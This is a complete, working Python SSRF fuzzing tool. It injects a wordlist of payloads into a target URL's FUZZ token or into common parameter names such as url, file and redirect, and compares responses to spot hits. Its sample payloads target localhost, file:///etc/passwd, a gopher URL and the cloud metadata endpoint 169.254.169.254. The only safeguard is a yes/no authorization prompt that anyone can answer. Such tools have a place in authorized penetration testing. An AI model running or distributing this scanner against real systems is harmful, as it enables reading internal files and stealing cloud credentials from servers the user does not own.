import requests
import time
import os
import urllib.parse

WORDLIST = "wordlist.txt"
RESULTS_FILE = "ssrf_results.txt"
TIMEOUT = 10

# Common parameter names to try when an explicit FUZZ token is not present
COMMON_PARAMS = [
    "url", "uri", "path", "file", "redirect", "next", "return",
    "callback", "host", "dest", "endpoint", "target", "data",
    "resource", "r", "u", "redir", "image", "img", "webhook"
]


def main():
    print("[*] SSRF / URL Injection Tester")
    print("Security reminder: only test targets you have explicit written permission to test.")
    auth = input("Do you have written authorization to test the target? (yes/no): ").strip().lower()
    if auth not in ("y", "yes"):
        print("[!] Authorization required. Aborting.")
        return

    target_url = input("Enter the target URL (use 'FUZZ' as injection point, e.g. 'http://a.com/?url=FUZZ'): ").strip()
    if not target_url:
        print("[!] No URL provided. Aborting.")
        return

    if not os.path.exists(WORDLIST):
        print(f"[!] Wordlist '{WORDLIST}' not found. Creating a sample file.")
        with open(WORDLIST, "w") as f:
            f.write("# Add payloads below (one per line), remove '#' to enable. Examples:\n")
            f.write("http://127.0.0.1\n")
            f.write("file:///etc/passwd\n")
            f.write("gopher://127.0.0.1:21/_\n")
            f.write("http://169.254.169.254/latest/meta-data/\n")
        print(f"[+] Sample '{WORDLIST}' created. Edit and re-run the tester.")
        return

    with open(WORDLIST, "r") as f:
        payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    if not payloads:
        print("[!] No payloads found in the wordlist. Aborting.")
        return

    use_fuzz = "FUZZ" in target_url
    if not use_fuzz:
        print("[*] No 'FUZZ' token found. The tester will try common parameter names (e.g. url,file,redirect) by appending or replacing parameters.")

    print(f"[+] Testing {len(payloads)} payload(s) against: {target_url}")

    results = []
    baseline_status = None
    baseline_len = None

    total_tests = 0
    for payload in payloads:
        encoded = urllib.parse.quote_plus(payload)

        # build list of test URLs for this payload
        test_urls = []
        if use_fuzz:
            test_urls = [target_url.replace("FUZZ", encoded)]
        else:
            parsed = urllib.parse.urlparse(target_url)
            original_qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

            # If URL already has query params, try replacing common param values when present
            if original_qs:
                for param in COMMON_PARAMS:
                    # try replacing any matching param name (case-insensitive)
                    new_qs = [(k, (payload if k.lower() == param else v)) for (k, v) in original_qs]
                    new_query = urllib.parse.urlencode(new_qs)
                    new_parsed = parsed._replace(query=new_query)
                    test_urls.append(urllib.parse.urlunparse(new_parsed))

                    # also try appending the param (in case the app expects that)
                    appended_qs = original_qs + [(param, payload)]
                    new_query2 = urllib.parse.urlencode(appended_qs)
                    new_parsed2 = parsed._replace(query=new_query2)
                    test_urls.append(urllib.parse.urlunparse(new_parsed2))
            else:
                # No existing query string: append each common param
                for param in COMMON_PARAMS:
                    new_query = urllib.parse.urlencode({param: payload})
                    new_parsed = parsed._replace(query=new_query)
                    test_urls.append(urllib.parse.urlunparse(new_parsed))

            # also add a generic 'payload' param as fallback
            parsed = urllib.parse.urlparse(target_url)
            new_query = urllib.parse.urlencode({"payload": payload})
            test_urls.append(urllib.parse.urlunparse(parsed._replace(query=new_query)))

        # de-duplicate test URLs
        seen = set()
        deduped_urls = []
        for u in test_urls:
            if u not in seen:
                seen.add(u)
                deduped_urls.append(u)

        for test_url in deduped_urls:
            total_tests += 1
            try:
                r = requests.get(test_url, timeout=TIMEOUT, allow_redirects=True)
                status = r.status_code
                length = len(r.content or b"")

                note = ""
                if baseline_status is None:
                    baseline_status = status
                    baseline_len = length
                else:
                    # mark as different if status changes or response length changes significantly
                    if status != baseline_status or abs(length - baseline_len) > max(50, int(baseline_len * 0.1)):
                        note = "DIFFERENT"

                print(f"    [{status}] {test_url} (len={length}) {note}")
                results.append({
                    "payload": payload,
                    "url": test_url,
                    "status": status,
                    "length": length,
                    "note": note
                })

            except Exception as e:
                print(f"    [ERROR] {test_url} ({e})")
                results.append({
                    "payload": payload,
                    "url": test_url,
                    "status": "ERROR",
                    "length": 0,
                    "note": str(e)
                })

            time.sleep(0.2)

    print(f"[+] Completed {total_tests} requests.")

    # Save results
    with open(RESULTS_FILE, "w") as f:
        f.write("=" * 60 + "\n")
        f.write("SSRF / URL Injection RESULTS\n")
        f.write("=" * 60 + "\n\n")
        for r in results:
            f.write(f"Payload: {r['payload']}\n")
            f.write(f"URL: {r['url']}\n")
            f.write(f"Status: {r['status']}\n")
            f.write(f"Length: {r['length']}\n")
            f.write(f"Note: {r['note']}\n\n")

    print(f"\n✅ Results saved to '{RESULTS_FILE}'.")


if __name__ == '__main__':
    main()
